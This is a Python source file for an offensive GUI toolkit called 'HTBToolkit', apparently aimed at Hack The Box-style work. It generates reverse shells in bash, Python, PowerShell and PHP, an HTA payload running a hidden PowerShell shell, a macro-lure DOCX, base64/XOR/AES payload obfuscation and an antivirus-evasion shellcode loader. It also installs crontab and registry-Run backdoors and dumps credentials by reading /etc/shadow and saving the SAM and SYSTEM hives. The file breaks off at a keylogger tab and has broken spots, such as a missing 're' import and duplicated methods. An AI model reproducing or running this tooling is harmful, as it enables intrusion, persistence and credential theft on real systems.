#!/usr/bin/env python3
import os
import sys
import socket
import base64
import threading
import platform
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import requests
import paramiko
import ftplib
import random
import string
import json
import time
import webbrowser
from datetime import datetime
from functools import lru_cache
import dns.resolver
import qrcode
from concurrent.futures import ThreadPoolExecutor
import smtplib
from email.mime.text import MIMEText
from fpdf import FPDF
import xml.etree.ElementTree as ET
import hashlib
import zlib
import marshal
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Windows-specific imports
if platform.system() == 'Windows':
    import win32api
    import pythoncom
    import pyHook
    import ctypes

class Config:
    """Configuration manager for the toolkit"""
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.load_config()
        return cls._instance
    
    def load_config(self):
        """Load configuration from file or set defaults"""
        self.config_file = "htbtoolkit_config.json"
        default_config = {
            "default_ports": [21, 22, 80, 443, 8080, 8443],
            "wordlists": {
                "ssh": "wordlists/ssh.txt",
                "web": "wordlists/web_dirs.txt"
            },
            "theme": "HTB Dark",
            "api_keys": {
                "virustotal": "",
                "shodan": ""
            }
        }
        
        try:
            with open(self.config_file, 'r') as f:
                self.config = json.load(f)
        except:
            self.config = default_config
            self.save_config()
    
    def save_config(self):
        """Save configuration to file"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
    
    def get(self, key, default=None):
        """Get config value"""
        return self.config.get(key, default)
    
    def set(self, key, value):
        """Set config value"""
        self.config[key] = value
        self.save_config()

class NetworkUtils:
    """Network utility functions"""
    
    @staticmethod
    @lru_cache(maxsize=100)
    def resolve_host(hostname):
        """DNS resolution with caching"""
        try:
            return socket.gethostbyname(hostname)
        except socket.gaierror:
            return None
    
    @staticmethod
    def get_local_ip():
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def is_port_open(host, port, timeout=1):
        """Check if port is open"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                return s.connect_ex((host, port)) == 0
        except:
            return False

class SecurityUtils:
    """Security-related utilities"""
    
    @staticmethod
    def generate_password(length=12):
        """Generate random password"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def obfuscate_powershell(script):
        """Obfuscate PowerShell script"""
        # Simple obfuscation - random case and variable names
        obfuscated = []
        var_map = {}
        
        for line in script.split('\n'):
            if line.strip() and not line.strip().startswith('#'):
                # Randomize case
                new_line = ''.join(
                    c.upper() if random.choice([True, False]) else c.lower() 
                    for c in line
                )
                
                # Replace variables
                for var in re.findall(r'\$[a-zA-Z_][a-zA-Z0-9_]*', new_line):
                    if var not in var_map:
                        var_map[var] = f'${SecurityUtils.generate_password(8)}'
                    new_line = new_line.replace(var, var_map[var])
                
                obfuscated.append(new_line)
        
        return '\n'.join(obfuscated)
    
    @staticmethod
    def encrypt_xor(data, key):
        """Simple XOR encryption"""
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

class ExploitGenerator:
    """Exploit payload generator"""
    
    @staticmethod
    def generate_reverse_shell(lhost, lport, shell_type='bash'):
        """Generate reverse shell commands"""
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"""python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'""",
            'powershell': f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""",
            'php': f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        }
        return shells.get(shell_type.lower(), "Unsupported shell type")
    
    @staticmethod
    def generate_malicious_docx(macro_code):
        """Generate DOCX with macro (template-based)"""
        # This is a simplified version - real implementation would use python-docx
        template = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p><w:r><w:t>Legitimate Document</w:t></w:r></w:p>
        <w:p><w:r><w:t>Please enable macros to view content</w:t></w:r></w:p>
    </w:body>
</w:document>"""
        
        # Add VBA macro project (simplified)
        malicious_docx = template.replace(
            "</w:document>", 
            f"<w:macros>{macro_code}</w:macros></w:document>"
        )
        return malicious_docx
    
    @staticmethod
    def generate_hta_payload(lhost, lport):
        """Generate HTA HTML Application payload"""
        return f"""
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "powershell -nop -w hidden -c $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", 0, True
</script>
</head>
<body>
    <h1>Document Loading...</h1>
</body>
</html>"""


class ObfuscationTools:
    @staticmethod
    def random_string(length=8):
        """Генерира случаен низ."""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    @staticmethod
    def base64_encode(data):
        """Base64 кодиране с произволен padding."""
        return base64.b64encode(data.encode()).decode()

    @staticmethod
    def xor_encrypt(data, key):
        """XOR шифроване."""
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

    @staticmethod
    def aes_encrypt(data, key):
        """AES шифроване."""
        cipher = AES.new(pad(key.encode(), AES.block_size), AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return base64.b64encode(cipher.iv + ct_bytes).decode()

    @staticmethod
    def generate_obfuscated_payload(payload, technique="base64"):
        """Генерира обфускиран payload."""
        if technique == "base64":
            return f"eval(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())"
        elif technique == "xor":
            key = ObfuscationTools.random_string(8)
            xor_data = ObfuscationTools.xor_encrypt(payload, key)
            return f"(lambda k,d: ''.join(chr(ord(c)^ord(k[i%len(k)])) for i,c in enumerate(d)))('{key}','{xor_data}')"
        elif technique == "aes":
            key = ObfuscationTools.random_string(16)
            return (
                f"__import__('Crypto.Cipher.AES').Cipher.AES.new("
                f"__import__('Crypto.Util.Padding').pad('{key}'.encode(), 16), "
                f"__import__('Crypto.Cipher.AES').MODE_CBC"
                f").decrypt(__import__('base64').b64decode('{ObfuscationTools.aes_encrypt(payload, key)}')).decode()"
            )
        return payload


class AVBypass:
    @staticmethod
    def generate_av_bypass_payload(payload):
        """Returns an AV-evasion-obfuscated version of the given payload."""
        junk_code = "\n".join([
            f"char var{random.randint(1000,9999)} = '{random.choice(string.ascii_letters)}';" for _ in range(5)
        ])

        encoded = base64.b64encode(payload.encode()).decode()

        stub = f"""
// --- AV Bypass: Polymorphic Loader ---
#include <windows.h>
#include <stdio.h>
#include <string.h>
{junk_code}

int main() {{
    char *b64 = "{encoded}";
    DWORD len = strlen(b64);
    DWORD decodedLen = len;
    BYTE *decoded = (BYTE*)malloc(decodedLen);
    
    DWORD outLen = 0;
    CryptStringToBinaryA(b64, len, CRYPT_STRING_BASE64, decoded, &decodedLen, NULL, NULL);

    void *exec = VirtualAlloc(0, decodedLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, decoded, decodedLen);
    ((void(*)())exec)(); // execute shellcode
    return 0;
}}
        """.strip()

        return stub

    
class Persistence:
    @staticmethod
    def install_persistence_linux():
        """Инсталира persistence в Linux системи."""
        return """
# Добавяне в crontab
(crontab -l 2>/dev/null; echo "@reboot /tmp/.backdoor") | crontab -
# Създаване на скрит файл
cp /bin/bash /tmp/.backdoor
chmod +x /tmp/.backdoor
        """.strip()

    @staticmethod
    def install_persistence_windows():
        """Инсталира persistence в Windows системи."""
        return """
# Добавяне в регистъра
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Update" /t REG_SZ /d "C:\\\\Windows\\\\Temp\\\\backdoor.exe" /f
# Копиране на изпълним файл
copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\Windows\\\\Temp\\\\backdoor.exe
        """.strip()
    
class ShellTools:
    # [Останалите методи остават същите...]
    @staticmethod
    def run_command(cmd):
        """Изпълнява командата и връща резултата."""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip() + ("\n" + result.stderr.strip() if result.stderr else "")
        except Exception as e:
            return f"Error: {e}"
        
    @staticmethod
    def check_sudo():
        """Проверява sudo права без парола."""
        return ShellTools.run_command("sudo -n true 2>/dev/null && echo 'Sudo without password' || echo 'Sudo requires password'")

class NetworkTools:
    @staticmethod
    def port_scan(target, ports="1-1024"):
        """Извършва бързо сканиране на портове."""
        return ShellTools.run_command(f"nc -zv {target} {ports} 2>&1 | grep succeeded")

    @staticmethod
    def http_server(port=8000):
        """Стартира HTTP сървър за файлово споделяне."""
        if platform.system() == "Windows":
            return ShellTools.run_command(f"powershell -command \"Start-Process python -ArgumentList '-m', 'http.server', '{port}'\"")
        return ShellTools.run_command(f"python3 -m http.server {port} &")

class PostExploitation:
    @staticmethod
    def dump_passwords_linux():
        commands = [
            "cat /etc/shadow",
            "grep -r 'password' /etc 2>/dev/null",
            "find / -name '*.kdbx' 2>/dev/null"
        ]
        return "\n".join(ShellTools.run_command(cmd) for cmd in commands)

    @staticmethod
    def dump_hashes_windows():
        return ShellTools.run_command("reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save")
    

class Scanner:
    """Network and vulnerability scanner"""
    
    @staticmethod
    def port_scan(target, ports, max_threads=50):
        """Multi-threaded port scanner"""
        open_ports = []
        lock = threading.Lock()
        
        def scan_port(port):
            if NetworkUtils.is_port_open(target, port):
                with lock:
                    open_ports.append(port)
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(scan_port, ports)
        
        return sorted(open_ports)
    
    @staticmethod
    def ping_sweep(network, timeout=1):
        """Network ping sweep"""
        alive_hosts = []
        
        def ping_host(ip):
            try:
                if platform.system() == "Windows":
                    command = f"ping -n 1 -w {timeout*1000} {ip}"
                else:
                    command = f"ping -c 1 -W {timeout} {ip}"
                
                if subprocess.call(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                    alive_hosts.append(ip)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(ping_host, [f"{network}.{i}" for i in range(1, 255)])
        
        return alive_hosts
    
    @staticmethod
    def web_vuln_scan(url):
        """Basic web vulnerability scanner"""
        results = {}
        
        # LFI test
        try:
            lfi_test = f"{url}../../../../etc/passwd"
            r = requests.get(lfi_test, timeout=5)
            if "root:" in r.text:
                results['LFI'] = "Vulnerable"
            else:
                results['LFI'] = "Not vulnerable"
        except:
            results['LFI'] = "Test failed"
        
        # XSS test
        try:
            xss_test = f"{url}?q=<script>alert(1)</script>"
            r = requests.get(xss_test, timeout=5)
            if "<script>alert(1)</script>" in r.text:
                results['XSS'] = "Potential vulnerability"
            else:
                results['XSS'] = "Not vulnerable"
        except:
            results['XSS'] = "Test failed"
        
        return results

class AIAssistant:
    """AI-powered analysis module"""
    
    def __init__(self, api_key=None):
        self.api_key = api_key or Config().get('api_keys', {}).get('openai', '')
    
    def analyze_logs(self, log_data):
        """Analyze logs with AI"""
        if not self.api_key:
            return "AI analysis requires API key"
        
        try:
            headers = {
                "Authorization": f"Bearer {self.api_key}",
                "Content-Type": "application/json"
            }
            
            payload = {
                "model": "gpt-3.5-turbo",
                "messages": [{
                    "role": "user",
                    "content": f"Analyze these logs for security issues:\n{log_data[:3000]}"
                }],
                "temperature": 0.7
            }
            
            response = requests.post(
                "https://api.openai.com/v1/chat/completions",
                headers=headers,
                json=payload
            )
            
            return response.json()['choices'][0]['message']['content']
        except Exception as e:
            return f"AI analysis failed: {str(e)}"

class HTBToolkitGUI:
    """Main GUI application"""
    
    THEMES = {
        "HTB Dark": {
            "bg": "#1a1a1a", "fg": "#00ff00", "font": ("Consolas", 10),
            "input_bg": "#2a2a2a", "input_fg": "#00ff00",
            "button_bg": "#3a3a3a", "button_fg": "#ffffff",
            "text_bg": "#0a0a0a", "text_fg": "#00ff00",
            "highlight": "#ff6600"
        },
        "Kali Light": {
            "bg": "#f0f0f0", "fg": "#333333", "font": ("Consolas", 10),
            "input_bg": "#ffffff", "input_fg": "#000000",
            "button_bg": "#357abd", "button_fg": "#ffffff",
            "text_bg": "#ffffff", "text_fg": "#000000",
            "highlight": "#ff6600"
        },
        "Matrix": {
            "bg": "#000000", "fg": "#00ff00", "font": ("Courier", 10),
            "input_bg": "#111111", "input_fg": "#00ff00",
            "button_bg": "#222222", "button_fg": "#00ff00",
            "text_bg": "#000000", "text_fg": "#00ff00",
            "highlight": "#ff0066"
        }
    }
    
    def __init__(self, root):
        self.root = root
        self.config = Config()
        self.current_theme = self.config.get("theme", "HTB Dark")
        
        # Initialize default_lhost before calling setup_gui()
        self.default_lhost = NetworkUtils.get_local_ip()
        
        # Initialize modules
        self.ai_assistant = AIAssistant()
        self.tabs = {}

        # Now setup the GUI
        self.setup_gui()
        self.keylogger = None

        self.tabs["Obfuscation"] = ttk.Frame(self.notebook)
        self.notebook.add(self.tabs["Obfuscation"], text="Obfuscation")
        self.init_obfuscation_tab()

        self.tabs["AV Bypass"] = ttk.Frame(self.notebook)
        self.notebook.add(self.tabs["AV Bypass"], text="AV Bypass")
        self.init_av_bypass_tab()

        self.tabs["Post-Exploit"] = ttk.Frame(self.notebook)
        self.notebook.add(self.tabs["Post-Exploit"], text="Post-Exploitation")
        self.init_post_exploit_tab()

        self.create_settings_tab()

    def setup_gui(self):
        """Setup main application window"""
        self.root.title("HTBToolkit v4.0 - Ultimate Red Team Toolkit")
        self.root.geometry("1200x800")
        self.apply_theme()
        
        # Create menu bar
        self.create_menu()
        
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Create tabs
        self.create_shell_tab()
        self.create_scanner_tab()
        self.create_exploit_tab()
        self.create_payload_tab()
        self.create_web_tab()
        self.create_ai_tab()
        
        if platform.system() == "Windows":
            self.create_keylogger_tab()
        
        
    
    def apply_theme(self):
        """Apply selected theme to all widgets"""
        theme = self.THEMES[self.current_theme]
        
        # Main window
        self.root.config(bg=theme["bg"])
        
        # Style configuration
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('.', 
                      background=theme["bg"],
                      foreground=theme["fg"],
                      fieldbackground=theme["input_bg"],
                      selectbackground=theme["button_bg"])
        
        style.configure('TNotebook', background=theme["bg"])
        style.configure('TNotebook.Tab', 
                       background=theme["bg"],
                       foreground=theme["fg"],
                       padding=[10, 5])
        
        style.map('TNotebook.Tab',
                 background=[('selected', theme["button_bg"])],
                 foreground=[('selected', theme["button_fg"])])
    
    def create_menu(self):
        """Create menu bar"""
        menubar = tk.Menu(self.root)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label="Exit", command=self.root.quit)
        menubar.add_cascade(label="File", menu=file_menu)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        tools_menu.add_command(label="Theme Selector", command=self.select_theme)
        tools_menu.add_command(label="Check for Updates", command=self.check_updates)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
        menubar.add_cascade(label="Help", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def create_shell_tab(self):
        """Create system shell tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="System Shell")
        
        # Command input
        cmd_frame = ttk.Frame(tab)
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.cmd_entry = ttk.Entry(cmd_frame)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.cmd_entry.insert(0, "whoami")
        
        ttk.Button(cmd_frame, text="Execute", command=self.execute_command).pack(side=tk.LEFT, padx=5)
        
        # Output
        self.shell_output = scrolledtext.ScrolledText(
            tab, 
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.shell_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Quick commands
        quick_frame = ttk.Frame(tab)
        quick_frame.pack(fill=tk.X, padx=5, pady=5)
        
        commands = [
            ("Network Info", "ipconfig" if platform.system() == "Windows" else "ifconfig"),
            ("Running Processes", "tasklist" if platform.system() == "Windows" else "ps aux"),
            ("System Info", "systeminfo" if platform.system() == "Windows" else "uname -a")
        ]
        
        for text, cmd in commands:
            ttk.Button(
                quick_frame, 
                text=text, 
                command=lambda c=cmd: self.execute_command(c)
            ).pack(side=tk.LEFT, padx=2)
    
    def create_scanner_tab(self):
        """Create network scanner tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Network Scanner")
        
        # Target input
        target_frame = ttk.Frame(tab)
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="Target:").pack(side=tk.LEFT, padx=5)
        self.scan_target = ttk.Entry(target_frame)
        self.scan_target.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.scan_target.insert(0, self.default_lhost)
        
        # Port range
        port_frame = ttk.Frame(tab)
        port_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(port_frame, text="Ports:").pack(side=tk.LEFT, padx=5)
        self.port_range = ttk.Entry(port_frame)
        self.port_range.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.port_range.insert(0, "21,22,80,443,8080")
        
        # Scan buttons
        btn_frame = ttk.Frame(tab)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(
            btn_frame, 
            text="Port Scan", 
            command=self.run_port_scan
        ).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(
            btn_frame, 
            text="Ping Sweep", 
            command=self.run_ping_sweep
        ).pack(side=tk.LEFT, padx=5)
        
        # Results
        self.scan_results = scrolledtext.ScrolledText(
            tab, 
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.scan_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_exploit_tab(self):
        """Create exploit development tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Exploit Dev")
        
        # Exploit type selection
        exploit_frame = ttk.Frame(tab)
        exploit_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(exploit_frame, text="Exploit Type:").pack(side=tk.LEFT, padx=5)
        self.exploit_type = ttk.Combobox(
            exploit_frame, 
            values=["Reverse Shell", "File Upload", "Privilege Escalation"]
        )
        self.exploit_type.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.exploit_type.current(0)
        
        # Target configuration
        target_frame = ttk.Frame(tab)
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="LHOST:").pack(side=tk.LEFT, padx=5)
        self.lhost_entry = ttk.Entry(target_frame)
        self.lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.lhost_entry.insert(0, self.default_lhost)
        
        ttk.Label(target_frame, text="LPORT:").pack(side=tk.LEFT, padx=5)
        self.lport_entry = ttk.Entry(target_frame, width=10)
        self.lport_entry.pack(side=tk.LEFT, padx=5)
        self.lport_entry.insert(0, "4444")
        
        # Generate button
        ttk.Button(
            tab, 
            text="Generate Exploit", 
            command=self.generate_exploit
        ).pack(padx=5, pady=5)
        
        # Exploit output
        self.exploit_output = scrolledtext.ScrolledText(
            tab, 
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.exploit_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_payload_tab(self):
        """Create payload generation tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Payloads")
        
        # Payload type selection
        payload_frame = ttk.Frame(tab)
        payload_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(payload_frame, text="Payload Type:").pack(side=tk.LEFT, padx=5)
        self.payload_type = ttk.Combobox(
            payload_frame, 
            values=["HTA", "PowerShell", "Python", "Bash", "DOCX Macro"]
        )
        self.payload_type.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.payload_type.current(0)
        
        # Target configuration
        target_frame = ttk.Frame(tab)
        target_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(target_frame, text="LHOST:").pack(side=tk.LEFT, padx=5)
        self.payload_lhost = ttk.Entry(target_frame)
        self.payload_lhost.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.payload_lhost.insert(0, self.default_lhost)
        
        ttk.Label(target_frame, text="LPORT:").pack(side=tk.LEFT, padx=5)
        self.payload_lport = ttk.Entry(target_frame, width=10)
        self.payload_lport.pack(side=tk.LEFT, padx=5)
        self.payload_lport.insert(0, "4444")
        
        # Generate button
        ttk.Button(
            tab, 
            text="Generate Payload", 
            command=self.generate_payload
        ).pack(padx=5, pady=5)
        
        # Payload output
        self.payload_output = scrolledtext.ScrolledText(
            tab, 
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.payload_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Save button
        ttk.Button(
            tab, 
            text="Save Payload", 
            command=self.save_payload
        ).pack(padx=5, pady=5)
    
    def create_web_tab(self):
        """Create web vulnerability scanner tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Web Scanner")
        
        # URL input
        url_frame = ttk.Frame(tab)
        url_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(url_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        self.web_url = ttk.Entry(url_frame)
        self.web_url.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.web_url.insert(0, "http://example.com")
        
        # Scan button
        ttk.Button(
            tab, 
            text="Scan for Vulnerabilities", 
            command=self.scan_web
        ).pack(padx=5, pady=5)
        
        # Results
        self.web_results = scrolledtext.ScrolledText(
            tab, 
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.web_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    def create_ai_tab(self):
        """Create AI assistant tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="AI Assistant")
        
        # API key
        key_frame = ttk.Frame(tab)
        key_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(key_frame, text="OpenAI API Key:").pack(side=tk.LEFT, padx=5)
        self.ai_key = ttk.Entry(key_frame, show="*")
        self.ai_key.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Input
        ttk.Label(tab, text="Input for Analysis:").pack(padx=5, pady=5)
        self.ai_input = scrolledtext.ScrolledText(
            tab, 
            height=10,
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.ai_input.pack(fill=tk.X, padx=5, pady=5)
        
        # Analyze button
        ttk.Button(
            tab, 
            text="Analyze", 
            command=self.analyze_with_ai
        ).pack(padx=5, pady=5)
        
        # Results
        ttk.Label(tab, text="Analysis Results:").pack(padx=5, pady=5)
        self.ai_output = scrolledtext.ScrolledText(
            tab, 
            height=10,
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        self.ai_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def obfuscate_payload(self, technique):
        """Обфускира payload с избраната техника."""
        payload = self.obf_payload.get(1.0, tk.END).strip()
        if payload:
            result = ObfuscationTools.generate_obfuscated_payload(payload, technique)
            self.obf_result.delete(1.0, tk.END)
            self.obf_result.insert(tk.END, result)

    def generate_av_bypass(self):
        """Генерира payload с AV bypass техники."""
        payload = self.av_payload.get(1.0, tk.END).strip()
        if payload:
            result = AVBypass.generate_av_bypass_payload(payload)
            self.av_result.delete(1.0, tk.END)
            self.av_result.insert(tk.END, result)

    def install_persistence(self):
        """Инсталира persistence в зависимост от OS."""
        if platform.system() == "Windows":
            result = Persistence.install_persistence_windows()
        else:
            result = Persistence.install_persistence_linux()
        self.post_output.delete(1.0, tk.END)
        self.post_output.insert(tk.END, result)

    def display_post_result(self, result):
        """Показва резултат в пост-експлоатационния таб."""
        self.post_output.delete(1.0, tk.END)
        self.post_output.insert(tk.END, str(result))

    def init_obfuscation_tab(self):
        """Инициализира таба за обфускация."""
        tab = self.tabs["Obfuscation"]

        # Входно поле за payload
        self._styled_label(tab, "Въведете payload за обфускация:")
        self.obf_payload = self._styled_text(tab, height=5)

        # Техники за обфускация
        tech_frame = tk.Frame(tab, bg=self.THEMES[self.current_theme]["bg"])
        tech_frame.pack(pady=5)

        self._styled_button(tech_frame, "Base64 Encode", lambda: self.obfuscate_payload("base64"))
        self._styled_button(tech_frame, "XOR Encrypt", lambda: self.obfuscate_payload("xor"))
        self._styled_button(tech_frame, "AES Encrypt", lambda: self.obfuscate_payload("aes"))

        # Резултат
        self._styled_label(tab, "Обфускиран payload:")
        self.obf_result = self._styled_text(tab, height=10)

    def init_av_bypass_tab(self):
        """Инициализира таба за AV bypass."""
        tab = self.tabs["AV Bypass"]

        self._styled_label(tab, "Въведете payload за AV bypass:")
        self.av_payload = self._styled_text(tab, height=5)

        self._styled_button(tab, "Генерирай AV Bypass Payload", self.generate_av_bypass)

        self._styled_label(tab, "Payload с AV bypass техники:")
        self.av_result = self._styled_text(tab, height=10)

    def init_post_exploit_tab(self):
        """Инициализира таба за пост-експлоатация."""
        tab = self.tabs["Post-Exploit"]

        linux_frame = tk.Frame(tab, bg=self.THEMES[self.current_theme]["bg"])
        linux_frame.pack(pady=5, fill='x')

        self._styled_button(linux_frame, "Dump Linux Passwords", lambda: self.display_post_result(PostExploitation.dump_passwords_linux()))
        self._styled_button(linux_frame, "Check Sudo Rights", lambda: self.display_post_result(ShellTools.check_sudo()))

        windows_frame = tk.Frame(tab, bg=self.THEMES[self.current_theme]["bg"])
        windows_frame.pack(pady=5, fill='x')

        self._styled_button(windows_frame, "Dump Windows Hashes", lambda: self.display_post_result(PostExploitation.dump_hashes_windows()))
        self._styled_button(windows_frame, "Install Persistence", self.install_persistence)

        self.post_output = self._styled_text(tab, height=15)

    def _styled_label(self, parent, text):
        return tk.Label(
            parent, text=text,
            bg=self.THEMES[self.current_theme]["bg"],
            fg=self.THEMES[self.current_theme]["fg"],
            font=self.THEMES[self.current_theme]["font"]
        ).pack(pady=2)

    def _styled_text(self, parent, height=10):
        txt = tk.Text(
            parent, height=height,
            bg=self.THEMES[self.current_theme]["text_bg"],
            fg=self.THEMES[self.current_theme]["text_fg"],
            insertbackground=self.THEMES[self.current_theme]["fg"]
        )
        txt.pack(fill="both", expand=True, padx=5, pady=5)
        return txt

    def _styled_button(self, parent, text, command):
        return tk.Button(
            parent, text=text, command=command,
            bg=self.THEMES[self.current_theme]["button_bg"],
            fg=self.THEMES[self.current_theme]["button_fg"]
        ).pack(padx=5, pady=3, side="left")

    def obfuscate_payload(self, technique):
        """Обфускира payload с избраната техника."""
        payload = self.obf_payload.get(1.0, tk.END).strip()
        if payload:
            result = ObfuscationTools.generate_obfuscated_payload(payload, technique)
            self.obf_result.delete(1.0, tk.END)
            self.obf_result.insert(tk.END, result)

    def generate_av_bypass(self):
        """Генерира payload с AV bypass техники."""
        payload = self.av_payload.get(1.0, tk.END).strip()
        if payload:
            result = AVBypass.generate_av_bypass_payload(payload)
            self.av_result.delete(1.0, tk.END)
            self.av_result.insert(tk.END, result)

    def install_persistence(self):
        """Инсталира persistence в зависимост от OS."""
        if platform.system() == "Windows":
            result = Persistence.install_persistence_windows()
        else:
            result = Persistence.install_persistence_linux()
        self.post_output.delete(1.0, tk.END)
        self.post_output.insert(tk.END, result)

    def display_post_result(self, result):
        """Показва резултат в пост-експлоатационния таб."""
        self.post_output.delete(1.0, tk.END)
        self.post_output.insert(tk.END, str(result))


    def create_keylogger_tab(self):
